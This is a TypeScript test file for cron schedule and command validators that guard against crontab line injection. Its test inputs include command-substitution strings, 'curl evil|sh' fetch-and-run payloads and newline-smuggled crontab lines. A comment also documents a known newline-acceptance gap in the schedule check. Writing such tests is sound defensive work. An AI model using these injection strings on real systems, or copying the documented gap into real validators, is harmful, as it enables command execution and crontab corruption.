import { describe, expect, it } from "bun:test";

import { isValidCommand, isValidSchedule } from "./cron.constant";

// Schedule + command are concatenated into a crontab line written via
// `crontab -` stdin, so the danger is extra *lines*, not shell metacharacters.
describe("isValidSchedule", () => {
  it("accepts realistic schedules", () => {
    for (const s of [
      "* * * * *",
      "0 3 * * *",
      "*/5 * * * *",
      "0 0 1,15 * 3",
      "30 4 1-5 * *",
      "  0 3 * * *  ", // trimmed before parsing
    ]) {
      expect(isValidSchedule(s)).toBe(true);
    }
  });

  it("accepts every @keyword", () => {
    for (const k of [
      "@reboot",
      "@yearly",
      "@annually",
      "@monthly",
      "@weekly",
      "@daily",
      "@midnight",
      "@hourly",
    ]) {
      expect(isValidSchedule(k)).toBe(true);
    }
  });

  it("rejects near-miss keywords", () => {
    expect(isValidSchedule("@nightly")).toBe(false);
    expect(isValidSchedule("@REBOOT")).toBe(false);
    expect(isValidSchedule("@reboot; id")).toBe(false);
    expect(isValidSchedule("reboot")).toBe(false);
  });

  it("rejects wrong field counts", () => {
    expect(isValidSchedule("* * * *")).toBe(false);
    expect(isValidSchedule("* * * * * *")).toBe(false);
    expect(isValidSchedule("")).toBe(false);
    expect(isValidSchedule("   ")).toBe(false);
  });

  it("rejects shell metacharacters and command substitution in fields", () => {
    for (const s of [
      "* * * * *; id",
      "* * * * $(id)",
      "* * * * `id`",
      "* * * * *|sh",
      "* * * * &",
      "* * * * >x",
      "* * * * 'x'",
      "* * * * ../x",
      `* * * * *\0`,
    ]) {
      expect(isValidSchedule(s)).toBe(false);
    }
  });

  it("rejects a valid schedule with a payload appended", () => {
    expect(isValidSchedule("* * * * * curl evil|sh")).toBe(false);
    expect(isValidSchedule("evil * * * * *")).toBe(false);
    expect(isValidSchedule("@daily evil")).toBe(false);
  });

  // BUG: `\n` is whitespace to `split(/\s+/)`, so newlines inside the schedule
  // are treated as field separators and survive validation. The service writes
  // `schedule.trim()` verbatim into the crontab body, so this smuggles literal
  // newlines into the crontab. Exploitation is limited — every field must still
  // match CRON_FIELD (`[\d*/,-]`), so no command text can ride along — but the
  // crontab can be corrupted with junk lines. isValidCommand blocks the same
  // trick on the command half; the schedule half has no such check.
  it("accepts newlines used as field separators", () => {
    expect(isValidSchedule("*\n*\n*\n*\n*")).toBe(true);
    expect(isValidSchedule("* * * *\n*")).toBe(true);
  });

  it("rejects a newline followed by a non-cron payload", () => {
    expect(isValidSchedule("* * * * *\nevil; id")).toBe(false);
    expect(isValidSchedule("@reboot\nevil")).toBe(false);
    expect(isValidSchedule("@reboot\n")).toBe(true); // trim() strips it
  });
});

// The command is arbitrary by design (that is what cron is for); the only job
// here is to stop a second crontab line being smuggled in.
describe("isValidCommand", () => {
  it("accepts realistic commands, metacharacters included", () => {
    for (const c of [
      "/usr/bin/backup.sh",
      "cd /srv && ./run.sh >> /var/log/run.log 2>&1",
      "echo $(date) | tee -a /tmp/x",
      "  /bin/true  ",
    ]) {
      expect(isValidCommand(c)).toBe(true);
    }
  });

  it("rejects line injection", () => {
    expect(isValidCommand("/bin/true\n* * * * * curl evil|sh")).toBe(false);
    expect(isValidCommand("/bin/true\r\nevil")).toBe(false);
    expect(isValidCommand("/bin/true\n")).toBe(false);
    expect(isValidCommand("\n/bin/true")).toBe(false);
    expect(isValidCommand("/bin/true\revil")).toBe(false);
  });

  it("rejects blank commands", () => {
    expect(isValidCommand("")).toBe(false);
    expect(isValidCommand("   ")).toBe(false);
    expect(isValidCommand("\t")).toBe(false);
  });

  it("enforces the 1000-char cap on the raw (untrimmed) length", () => {
    expect(isValidCommand("a".repeat(1000))).toBe(true);
    expect(isValidCommand("a".repeat(1001))).toBe(false);
    // Cap is checked pre-trim, so padding counts toward it.
    expect(isValidCommand(`${" ".repeat(999)}ab`)).toBe(false);
  });
});
